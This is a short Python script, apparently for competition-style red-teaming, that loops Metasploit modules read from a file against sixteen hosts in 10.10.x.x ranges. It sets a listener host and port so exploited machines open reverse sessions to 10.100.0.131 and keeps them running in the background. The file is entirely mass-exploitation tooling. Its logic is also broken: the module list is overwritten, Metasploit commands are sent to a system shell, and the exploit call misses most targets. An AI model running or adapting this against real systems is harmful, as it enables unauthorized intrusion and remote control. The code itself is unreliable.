import os, sys, subprocess
from time import sleep
#client = msfrpc.Msfrpc({})
#client.login('msf', '123')
#ress = client.call('console.create')
#console_id = ress['id']

os.system("msfconsole")

with open("msa.txt","r") as infile:
    for line in infile:
        line_list = line.split("\n")
    infile.close()

rhost_list = ["101","102","103","104","105","106","107","108"]
rhosts = []
for rh in rhost_list:
    ip = "10.10." + rh + ".10"
    oip = "10.10." + rh + ".5"
    rhosts.append(ip)
    rhosts.append(oip)

LPORT="444"
LHOST="10.100.0.131"

for line in line_list:
    for RHOST in rhosts:
        commands = line + """
set RHOST """+RHOST+"""
set LHOST """+LHOST+"""
set LPORT """+LPORT+"""
set ExitOnSession false
exploit -z
"""
    print("[+] Exploiting on: "+RHOST)
    os.system(commands)
#    client.call('console.write',[console_id,commands])
#    res = client.call('console.read',[console_id])
#    result = res['data'].split('\n')
